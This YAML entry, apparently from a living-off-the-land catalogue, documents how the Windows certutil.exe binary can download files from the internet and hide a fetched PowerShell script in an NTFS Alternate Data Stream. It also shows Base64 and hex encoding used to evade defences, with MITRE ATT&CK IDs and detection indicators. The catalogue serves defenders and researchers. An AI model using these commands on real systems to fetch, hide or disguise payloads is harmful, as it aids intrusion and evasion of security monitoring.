---
Name: Certutil.exe
Description: Windows binary used for handling certificates
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
    Description: Download and save 7zip to disk in the current folder.
    Usecase: Download file from Internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
    Description: Download and save 7zip to disk in the current folder.
    Usecase: Download file from Internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
    Description: Download and save a PS1 file to an Alternate Data Stream (ADS).
    Usecase: Download file from Internet and save it in an NTFS Alternate Data Stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: certutil -encode inputFileName encodedOutputFileName
    Description: Command to encode a file using Base64
    Usecase: Encode files to evade defensive measures
    Category: Encode
    Privileges: User
    MitreID: T1027
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: certutil -decode encodedInputFileName decodedOutputFileName
    Description: Command to decode a Base64 encoded file.
    Usecase: Decode files to evade defensive measures
    Category: Decode
    Privileges: User
    MitreID: T1140
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: certutil --decodehex encoded_hexadecimal_InputFileName
    Description: Command to decode a hexadecimal-encoded file decodedOutputFileName
    Usecase: Decode files to evade defensive measures
    Category: Decode
    Privileges: User
    MitreID: T1140
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\certutil.exe
  - Path: C:\Windows\SysWOW64\certutil.exe
Code_Sample:
  - Code:
Detection:
  - IOC: Certutil.exe creating new files on disk
  - IOC: Useragent Microsoft-CryptoAPI/10.0
  - IOC: Useragent CertUtil URL Agent
Resources:
  - Link: https://twitter.com/Moriarty_Meng/status/984380793383370752
  - Link: https://twitter.com/mattifestation/status/620107926288515072
  - Link: https://twitter.com/egre55/status/1087685529016193025
Acknowledgement:
  - Person: Matt Graeber
    Handle: '@mattifestation'
  - Person: Moriarty
    Handle: '@Moriarty_Meng'
  - Person: egre55
    Handle: '@egre55'
  - Person: Lior Adar
---
